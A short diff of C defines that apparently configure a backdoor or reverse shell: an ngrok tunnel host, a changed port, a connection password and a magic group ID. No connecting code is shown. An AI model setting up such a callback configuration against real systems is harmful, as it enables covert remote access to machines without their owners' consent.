@@ -6,7 +6,7 @@
 // #define VERBOSE
 #define __i386__
 #define HOST "84fb-2a02-b023-10-97be-9d7a-cf1f-6ab4-3ac5.ngrok-free.app"
-#define PORT 45435
+#define PORT 4543
 #define BUFFER_SIZE 1024
-#define PASSWORD "password"
+#define PASSWORD "password\n"
 #define GID 5435
